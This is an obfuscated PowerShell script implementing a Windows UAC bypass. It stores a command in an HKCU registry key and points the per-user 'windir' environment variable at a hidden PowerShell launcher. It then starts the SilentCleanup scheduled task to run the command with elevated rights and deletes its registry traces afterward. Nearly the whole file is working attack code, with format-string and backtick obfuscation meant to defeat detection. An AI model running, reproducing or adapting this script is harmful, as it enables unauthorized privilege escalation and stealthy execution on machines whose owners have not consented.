 $fmajr  =  [tYpE]("{2}{3}{1}{0}"-f 't','ONmen','EnV','iR') ;function inV`OKe`-enVB`yp`A`Ss {


    [CmdletBinding(SUPpOrTSSHOuLdprOcEsS = ${tr`UE}, COnfIRMImpaCt = "Me`DIUM")]
    Param (
        [Parameter(manDAToRY = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${c`Om`ManD},

        [Switch]
        ${f`oRCe}
    )
    ${con`seN`TpRom`pt} = (&("{4}{0}{1}{2}{3}"-f '-It','emP','rop','erty','Get') ((("{16}{3}{13}{10}{9}{15}{5}{8}{2}{0}{6}{1}{12}{11}{7}{14}{4}" -f '0}Cu','ersi','ows{','KLM','em','t{0}','rrentV','s{0','Wind','RE{0}Microso','SOFTWA','{0}Policie','on',':{0}','}Syst','f','H')) -f [cHaR]92))."Co`NsEN`T`PRoMpTbEHAVio`RaDMIN"
    ${se`CurED`es`KToP`PRomPt} = (.("{3}{0}{1}{2}{4}"-f 't-I','t','emPrope','Ge','rty') (("{9}{6}{10}{1}{5}{7}{2}{8}{11}{0}{3}{12}{4}" -f'S','softuE','uEoPoli','y','tem','oWind','REuEoMic','owsuEoCurrentVersion','c','HKLM:uEoSOFTWA','ro','iesuEo','s'))."Re`PlacE"('uEo',[STRInG][chAr]92))."PRO`mpT`ONSecu`REDe`s`KTop"

    if(($(&("{2}{0}{1}"-f 'oam','i','wh') ("{1}{2}{0}"-f's','/gro','up')) -like ("{3}{2}{0}{1}"-f '5-32-54','4*','-1-','*S'))."Len`g`TH" -eq 0) {
        ("{5}{2}{9}{3}{1}{4}{8}{6}{0}{7}"-f'tor','rent user not a loca','!]','r','l a','[','nistra','!','dmi',' Cu')
        Throw (("{3}{1}{0}{7}{8}{10}{2}{9}{4}{5}{6}" -f 't u','rren','oca','Cu','dminist','r','ator!','ser ','not','l a',' a l'))
    }
    if (($(.("{0}{2}{1}"-f 'wh','ami','o') ("{1}{0}" -f 'oups','/gr')) -like ("{3}{0}{2}{1}"-f '-1-1','92*','6-81','*S'))."lENG`TH" -eq 0) {
        ("{7}{6}{4}{3}{1}{0}{5}{2}"-f'u','di','cess!','a me','t in ','m integrity pro','No','[!] ')
        Throw (("{5}{1}{4}{6}{3}{7}{0}{2}" -f 'c',' a medi','ess!','t','um inte','Not in','gri','y pro'))
    }

     
     
     ${R`egp`ATh} = ((("{1}{10}{13}{11}{4}{0}{5}{3}{6}{2}{12}{9}{8}{7}" -f 'Mic','HKC','tr','o','estr','ros','fts','owsstrUpdate','d','in','U:So','r','W','ftwa'))  -CreplaCE'str',[ChaR]92)
     ${p`A`RtS} = ${re`G`PaTH}.("{1}{0}"-f 't','spli').Invoke('\');
     ${p`ATH} = ${r`eg`PATH}.("{0}{1}"-f's','plit').Invoke("\")[0..(${P`ARTS}."co`UNT" -2)] -join '\';
     ${Na`Me} = ${p`AR`TS}[-1];
     ${n`ULl} = &("{0}{1}{2}{3}"-f'Set-Item','P','r','operty') -Force -Path ${P`AtH} -Name ${na`Me} -Value ${c`OMm`And};


     ${ENVc`omM`ANd`PATh} = ((("{4}{2}{0}{3}{1}" -f':cIL','ironment','KCU','Env','H')).("{1}{2}{0}" -f'E','rEplA','C').Invoke('cIL','\'))
     ${lau`NChErcoMM`AnD} = ${ps`h`ome} + '\' + ('p'+'owe'+'rsh'+'ell.exe'+' '+'-NoP'+' '+'-No'+'n'+'I '+'-w'+' '+'Hidde'+'n'+' '+'-'+'c '+(('gZX'+'x=gZX(('+'gp'+' ') -ReplACE ([cHAR]103+[cHAR]90+[cHAR]88),[cHAR]36)+('HKCU:S'+'o'+'ftware{0}Micro'+'s'+'oft{0}W'+'ind'+'ows ') -f  [CHAr]92+'Updat'+'e'+').'+'Upd'+'ate); '+'p'+'owers'+'hell'+' '+'-N'+'oP '+'-'+'NonI'+' '+'-'+'w '+'H'+'idde'+'n '+'-enc'+' '+('R'+'QMx; ')."rE`pl`Ace"(([cHar]82+[cHar]81+[cHar]77),[StrinG][cHar]36)+'Sta'+'rt-'+'Slee'+'p '+'-Secon'+'d'+'s '+'1')

     if (${f`OrcE} -or ((.("{1}{2}{0}"-f'emProperty','Ge','t-It') -Path ${eNv`Com`mAndpath} -Name ("{0}{1}" -f 'windi','r') -ErrorAction ("{2}{0}{1}{3}"-f'il','entlyContin','S','ue')) -eq ${NU`lL})){
         .("{1}{0}{2}" -f 'Ite','New-','m') ${Env`co`mMANDpA`Th} -Force |
             .("{4}{2}{3}{1}{5}{0}" -f'ty','rope','Ite','mP','New-','r') -Name ("{1}{0}"-f 'dir','win') -Value ${lAuN`cHe`RC`O`MmAND} -PropertyType ("{2}{0}{1}"-f'in','g','str') -Force | &("{2}{1}{0}"-f 'll','ut-Nu','O')
     }else{
         &("{3}{0}{2}{1}" -f't','rning','e-Wa','Wri') ("{5}{3}{8}{0}{6}{4}{7}{2}{1}"-f'l','r using -Force','ide','ey ','ady exi','K','re','sts, cons','a')
         exit
     }

     if (&("{2}{0}{1}"-f'est-Pat','h','T') ${EnvC`Omma`N`Dp`ATh}) {
         .("{1}{2}{0}" -f'e','Writ','e-Verbos') ("{5}{3}{4}{6}{0}{1}{2}"-f ' to cha','nge w','indir','d re','gistr','Create','y entries')
     }else{
         &("{0}{1}{2}"-f 'Write','-Wa','rning') ("{2}{8}{6}{1}{5}{7}{3}{4}{0}" -f ' exiting','eate r','Fa','try k','ey,','egi','to cr','s','iled ')
         exit
     }

     ${S`C`hTAsKspAtH} = .("{0}{2}{1}"-f 'Join-','ath','P') -Path (  (  .("{2}{1}{0}"-f'Le','ab','VaRI')  ('f'+'MAJR')  -vAlueonLy )::("{1}{0}{2}{3}" -f'etFo','G','lder','Path').Invoke(("{1}{0}{2}"-f'ste','Sy','m'))) -ChildPath ("{2}{3}{1}{0}" -f 'e','ex','schta','sks.')
     if (${P`sCmdl`eT}.("{1}{2}{3}{0}" -f'Process','S','ho','uld').Invoke(${scHTAS`kSPa`Th}, ("{0}{2}{1}" -f 'Star','cess','t pro'))) {
         ${pRO`Ce`Ss} = &("{2}{0}{3}{1}"-f'tart-P','ess','S','roc') -FilePath ${sc`HTA`sKS`pAth} -ArgumentList ((("{5}{6}{3}{7}{8}{10}{2}{9}{11}{1}{4}{12}{0}" -f ' /I','tCl','upuLlSil',' /TN uLlMicrosoftuLlW','ea','/Ru','n','indowsuL','lDisk','e','Clean','n','nup'))-rEPlAce  ([ChaR]117+[ChaR]76+[ChaR]108),[ChaR]92) -PassThru -WindowStyle ("{1}{0}"-f 'dden','Hi')
         &("{3}{0}{2}{4}{1}"-f'e','se','-V','Writ','erbo') ("{5}{2}{0}{1}{4}{3}"-f'sc','htasks','tarted ','xe','.e','S')
     }

     
     &("{2}{3}{0}{4}{1}" -f'o','e','Writ','e-Verb','s') ("{1}{2}{4}{0}{3}{6}{5}" -f'nds to','S','leeping 5 se',' trigger p','co','oad','ayl')
     if (-not ${Ps`BoUnDPaRAM`E`Ters}[("{0}{1}{2}"-f 'Wh','at','If')]) {
         .("{2}{1}{0}{3}" -f 'l','-S','Start','eep') -Seconds 5
     }

     ${e`NVf`iLEp`Ath} = ((("{0}{2}{1}{3}"-f'HKCU:0cl','nv','E','ironment'))."REPL`A`Ce"('0cl',[sTRINg][CHaR]92))
     ${EnvfiLe`K`EY} = ("{1}{2}{0}" -f 'dir','wi','n')
     ${PaYl`O`ADp`ATh} = ((("{2}{0}{7}{1}{5}{8}{6}{4}{3}"-f'KCU','SoftwarelHoM','H','ws','ndo','ic','i',':','rosoftlHoW'))-repLAcE'lHo',[chAr]92)
     ${p`A`y`lOAdKEY} = ("{0}{1}"-f'Upd','ate')

     if (&("{0}{1}"-f 'Test-','Path') ${eNv`FIL`E`Path}) {
         
         .("{1}{0}{4}{2}{3}{5}"-f'-','Remove','em','Prop','It','erty') -Force -Path ${ENvF`Il`EpAth} -Name ${EnV`F`IlEKey}
         &("{5}{4}{3}{2}{1}{0}" -f'y','t','emProper','t','-I','Remove') -Force -Path ${p`A`yLoADpATH} -Name ${PAY`LOa`DKey}
         &("{1}{2}{0}{3}"-f 'rbos','Wri','te-Ve','e') ("{0}{2}{4}{3}{1}{5}"-f 'Remove','n','d regis',' e','try','tries')
     }
}